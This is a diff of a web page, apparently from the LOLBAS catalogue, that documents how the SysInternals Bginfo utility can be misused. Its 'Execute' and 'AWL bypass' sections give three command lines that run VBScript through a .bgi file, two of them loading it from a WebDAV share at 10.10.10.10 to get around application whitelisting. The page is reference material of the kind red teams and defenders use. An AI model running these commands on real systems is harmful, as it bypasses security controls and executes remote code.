@@ -28,15 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/OtherMSBinaries/Bginfo/#awl bypass">AWL bypass</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/OtherMSBinaries/Bginfo/#execute">Execute</a></li>
+	
+	
+	<li><a href="/lolbas/OtherMSBinaries/Bginfo/#awl bypass">AWL bypass</a></li>
+	
 </ul>
 
+	
+
 <p>Background Information Utility included with SysInternals Suite</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -48,88 +55,129 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/">https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/</a></li>
+	<a href="https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/">https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a </li>
+	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="awl bypass" class="function-name">AWL bypass</h2>
-
-<p>The LOLBAS can bypass application whitelisting solutions.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Execute VBscript code that is referenced within the bginfo.bgi file.</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Execute VBscript code that is referenced within the bginfo.bgi file.
+		<br>
+		<pre><code>bginfo.exe bginfo.bgi /popup /nolicprompt</code></pre>
 		Usecase:Local execution of VBScript
-        <pre><code>bginfo.exe bginfo.bgi /popup /nolicprompt</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Execute bginfo.exe from a WebDAV server.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Execute bginfo.exe from a WebDAV server.
+		<br>
+		<pre><code>\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt</code></pre>
 		Usecase:Remote execution of VBScript
-        <pre><code>\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>This style of execution may not longer work due to patch.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		This style of execution may not longer work due to patch.
+		<br>
+		<pre><code>\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt</code></pre>
 		Usecase:Remote execution of VBScript
-        <pre><code>\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
+	
+<h2 id="awl bypass" class ="function-name">AWL bypass</h2>
+	
+		Execute VBscript code that is referenced within the bginfo.bgi file.
+		<br>
+		<pre><code>bginfo.exe bginfo.bgi /popup /nolicprompt</code></pre>
+		Usecase:Local execution of VBScript
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Execute bginfo.exe from a WebDAV server.
+		<br>
+		<pre><code>\\10.10.10.10\webdav\bginfo.exe bginfo.bgi /popup /nolicprompt</code></pre>
+		Usecase:Remote execution of VBScript
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		This style of execution may not longer work due to patch.
+		<br>
+		<pre><code>\\live.sysinternals.com\Tools\bginfo.exe \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt</code></pre>
+		Usecase:Remote execution of VBScript
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
